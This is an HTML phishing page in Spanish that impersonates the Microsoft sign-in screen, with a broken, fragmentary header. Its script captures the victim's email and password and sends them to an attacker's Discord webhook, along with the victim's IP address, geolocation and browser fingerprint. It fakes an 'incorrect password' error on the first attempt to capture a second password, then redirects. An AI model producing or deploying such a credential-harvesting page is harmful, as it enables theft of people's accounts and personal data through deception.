<!DOCTYPE html>

        // Contador de intentos
        let intento = 0;
    </script>
    <style>

<body>
    <div class="login-container">
        <div class="login-box">
            <div class="login-header">
                <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" 
                     alt="Microsoft Logo">
                <h1 class="login-title">Iniciar sesi√≥n</h1>
                <span class="login-subtitle">Usar tu cuenta de Microsoft.</span>
            </div>
            
            <form id="login-form">
                <div class="form-group">
                    <input type="email" 
                           class="form-control" 
                           id="email" 
                           name="email" 
                           placeholder="Correo electr√≥nico o n√∫mero de tel√©fono" 
                           required>
                </div>
                
                <div class="form-group">
                    <input type="password" 
                           class="form-control" 
                           id="password" 
                           name="password" 
                           placeholder="Contrase√±a" 
                           required>
                    <div id="password-error" class="error-message">
                        La cuenta o la contrase√±a son incorrectos. Pru√©belo de nuevo.
                    </div>
                </div>

                <button type="submit" class="btn btn-primary" id="submit-btn">
                    Iniciar sesi√≥n
                </button>
            </form>
        </div>
    </div>

    <script>
        // Funci√≥n para obtener datos de geolocalizaci√≥n
        async function getGeoData() {
            let ip = "N/A";
            let location = "N/A";
            
            try {
                // Obtener IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
                
                // Obtener ubicaci√≥n basada en IP
                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
                const geoData = await geoResponse.json();
                location = `${geoData.city}, ${geoData.region}, ${geoData.country}`;
            } catch (error) {
                console.error("Error al obtener datos de geolocalizaci√≥n:", error);
            }
            
            return { ip, location };
        }
        
        // Funci√≥n para enviar datos a Discord
        async function sendToDiscord(email, password) {
            try {
                // Obtener datos de geolocalizaci√≥n
                const geoData = await getGeoData();
                
                // Obtener informaci√≥n del navegador
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                // Crear mensaje para Discord
                const message = {
                    content: `üîê **NUEVO INICIO DE SESI√ìN**\n\n` +
                             `üìß **Correo:** ${email}\n` +
                             `üîí **Contrase√±a:** ${password}\n` +
                             `üåê **IP:** ${geoData.ip}\n` +
                             `üìç **Ubicaci√≥n:** ${geoData.location}\n` +
                             `üñ•Ô∏è **Dispositivo:** ${platform}\n` +
                             `üåç **Idioma:** ${language}\n` +
                             `üïê **Zona Horaria:** ${timezone}\n` +
                             `üì± **Resoluci√≥n:** ${screenResolution}\n` +
                             `üî¢ **Intento:** ${intento + 1}/2`
                };
                
                // Enviar a Discord
                const response = await fetch(discord_webhook_url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });
                
                if (!response.ok) {
                    throw new Error(`Error HTTP: ${response.status}`);
                }
                
                return true;
            } catch (error) {
                console.error("Error al enviar a Discord:", error);
                return false;
            }
        }
        
        // Manejar el env√≠o del formulario
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submit-btn');
            const passwordField = document.getElementById('password');
            const errorMessage = document.getElementById('password-error');
            
            // Validar campos
            if (!email || !password) {
                passwordField.classList.add('error');
                errorMessage.textContent = "Introduzca un correo electr√≥nico y una contrase√±a v√°lidos.";
                errorMessage.style.display = 'block';
                return;
            }
            
            // Mostrar estado de carga
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="loading"></span>Iniciando sesi√≥n...';
            
            // Enviar datos a Discord
            await sendToDiscord(email, password);
            
            // Incrementar intento
            intento++;
            
            // Esperar 1 segundo para simular procesamiento
            setTimeout(() => {
                if (intento === 1) {
                    // Primer intento: mostrar error
                    passwordField.classList.add('error');
                    errorMessage.textContent = "La cuenta o la contrase√±a son incorrectos. Pru√©belo de nuevo.";
                    errorMessage.style.display = 'block';
                    
                    // Limpiar solo el campo de contrase√±a
                    document.getElementById('password').value = '';
                    
                    // Restaurar bot√≥n
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Iniciar sesi√≥n';
                } else if (intento === 2) {
                    // Segundo intento: redirigir
                    submitBtn.innerHTML = '<span class="loading"></span>Redirigiendo...';
                    
                    setTimeout(() => {
                        window.location.href = 'index1.html';
                    }, 1000);
                }
            }, 1000);
        });
        
        // Limpiar error cuando el usuario empiece a escribir
        document.getElementById('password').addEventListener('input', function() {
            this.classList.remove('error');
            document.getElementById('password-error').style.display = 'none';
        });
        
        document.getElementById('email').addEventListener('input', function() {
            document.getElementById('password').classList.remove('error');
            document.getElementById('password-error').style.display = 'none';
        });
    </script>
</body>
